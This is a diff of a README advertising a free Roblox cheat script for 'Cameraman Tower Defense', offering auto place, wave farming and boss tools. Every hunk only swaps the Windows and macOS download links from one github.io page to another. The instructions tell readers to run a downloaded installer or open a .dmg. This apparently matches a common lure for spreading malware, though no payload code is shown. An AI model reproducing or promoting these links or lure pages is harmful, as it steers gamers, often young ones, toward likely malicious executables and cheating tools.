@@ -4,9 +4,9 @@
 
 > 📷 Cameraman Tower Defense script with auto place, wave farm, upgrade loop, and boss phase tools. Build the perfect defense and farm every wave without strategy stress.
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 Whether you're grinding for hours or just getting started, **Cameraman Tower Defense Script** delivers everything you need to dominate the game. Built for both casual players and dedicated grinders, this free Roblox script gives you the edge to progress faster, earn more, and enjoy the game on your own terms.
 
@@ -16,7 +16,7 @@ Whether you're grinding for hours or just getting started, **Cameraman Tower Def
 - Regular updates to stay compatible with the latest game patches
 - Lightweight and optimized for smooth gameplay
 
-### [⬇️ Download Cameraman Tower Defense Script](https://spearsurvive.github.io/win/)
+### [⬇️ Download Cameraman Tower Defense Script](https://zenboulderagora.github.io/Windw/)
 
 ---
 
@@ -65,7 +65,7 @@ Whether you're grinding for hours or just getting started, **Cameraman Tower Def
 
 ### 🖥️ Windows (PC)
 
-[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://spearsurvive.github.io/win/)
+[![Download for Windows](https://img.shields.io/badge/DOWNLOAD%20FOR%20WINDOWS-1a73e8?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
 
 1. Click the **Download for Windows** button above
 2. Run the downloaded installer file
@@ -77,7 +77,7 @@ Whether you're grinding for hours or just getting started, **Cameraman Tower Def
 
 ### 🍏 macOS (Intel/Apple Silicon)
 
-[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://spearsurvive.github.io/mac/)
+[![Download for macOS](https://img.shields.io/badge/DOWNLOAD%20FOR%20MACOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
 
 1. Click the **Download for macOS** button above
 2. Open the downloaded `.dmg` and drag to Applications
